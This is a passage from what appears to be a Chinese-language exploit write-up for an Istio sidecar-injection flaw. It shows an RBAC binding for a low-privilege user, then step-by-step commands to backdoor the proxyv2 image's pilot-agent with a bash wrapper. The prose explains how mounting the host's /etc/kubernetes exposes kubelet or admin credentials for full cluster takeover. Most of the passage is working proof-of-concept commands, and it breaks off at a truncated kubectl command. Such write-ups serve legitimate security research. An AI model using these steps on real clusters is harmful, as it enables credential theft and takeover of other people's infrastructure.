      resources: ["gateways"]
      verbs: ["create"]
    ---    apiVersion: rbac.authorization.k8s.io/v1
    kind: ClusterRoleBinding
    metadata:
      name: test-gateways-only-create
    subjects:
    - kind: User
      name: test
      apiGroup: rbac.authorization.k8s.io
    roleRef:
      kind: ClusterRole
      name: gateways-only-create
      apiGroup: rbac.authorization.k8s.io
    EOF
在利用漏洞之前，我们需要先制作一个恶意的 docker 镜像，我这里直接选择了 proxyv2 镜像作为目标镜像，替换其中的
`/usr/local/bin/pilot-agent` 为 bash 脚本，在 tag 一下 push 到本地的 registry 或者
[docker.io](http://docker.io) 都可以。
    docker run -it  --entrypoint /bin/sh istio/proxyv2:1.12.1
    cp /usr/local/bin/pilot-agent /usr/local/bin/pilot-agent-orig
    cat  /usr/local/bin/pilot-agent
    #!/bin/bash
    echo $1
    if [ $1 != "istio-iptables" ]
    then
        touch /tmp/test/pwned
        ls -lha /tmp/test/*
        cat /tmp/test/*
    fi
    /usr/local/bin/pilot-agent-orig $*
    EOF
    chmod +x /usr/local/bin/pilot-agent
    exit
    docker tag 0e87xxxxcc5c xxxx/proxyv2:malicious
commit 之前记得把 image 的 entrypoint 改为 `/usr/local/bin/pilot-agent`
接着利用下列的命令完成攻击，注意我覆盖了注解中的 `inject.istio.io/templates` 为 sidecar 使能让 k8s
controller 在创建 pod 任务的时候，让其注解中的 `inject.istio.io/templates` 也为 sidecar，这样
istiod 的 inject webhook 就会按照 sidecar 的模版进行渲染 pod 资源文件，
`sidecar.istio.io/userVolume` 和 `sidecar.istio.io/userVolumeMount` 我这里挂载了
`/etc/kubernetes` 目录，为了和上面的恶意镜像相辅相成， POC 的效果就是直接打印出 Host 中 `/etc/kubernetes`
目录下的凭证及配置文件，利用 kubelet 的凭证或者 admin token 就可以提权完成接管整个集群，当然你也可以挂载 docker.sock
可以做到更完整的利用。
    kubectl --as test create -f - 
  2. 
  3. 
  4. 
* * *